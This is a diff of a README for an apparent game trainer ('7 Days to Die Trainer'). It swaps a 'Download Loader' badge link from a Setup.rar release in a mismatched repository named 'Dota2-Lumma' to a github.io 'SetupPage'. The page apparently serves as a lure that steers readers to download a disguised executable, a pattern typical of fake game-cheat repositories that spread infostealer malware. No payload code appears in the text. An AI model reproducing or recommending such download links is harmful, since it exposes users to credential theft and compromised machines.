@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for 7 Days to Die Trainer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `7-Days-to-Die-Trainer` · Updated: 2026-11-04
 
 **Tags:** `7-days-to-die` `trainer` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
 
